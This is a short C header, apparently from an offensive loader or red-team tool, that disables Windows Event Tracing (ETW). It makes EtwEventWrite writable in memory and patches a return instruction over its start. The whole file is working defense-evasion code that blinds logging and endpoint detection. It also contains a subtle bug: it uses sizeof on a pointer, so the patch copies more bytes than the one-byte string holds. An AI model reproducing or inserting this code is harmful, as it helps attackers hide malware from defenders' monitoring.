#pragma once
#include "headers.h"
#include "helpers.h"
#include "defs.h"

BOOL DisableETW();

BOOL DisableETW() {

	BOOL res = FALSE;
	DWORD lpflOldProtect = 0;

	const char* ret = "\xc3";

	FARPROC etw = GetNTAPIAddress(strEtwEventWrite);
	if (etw == NULL) {
		return res;
	}

	if (VirtualProtect(etw, sizeof(ret), PAGE_READWRITE, &lpflOldProtect) != 0) {
		printf("[+] Modified ETW event write address ->	\t( RW )\n");

		ZwMoveMemory(etw, (const PVOID)ret, sizeof(ret));
		
		if (VirtualProtect(etw, sizeof(ret), lpflOldProtect, &lpflOldProtect) != 0) {
			res = TRUE;
		}
		else {
			return res;
		}
	}
	else {
		return res;
	}

	return res;
}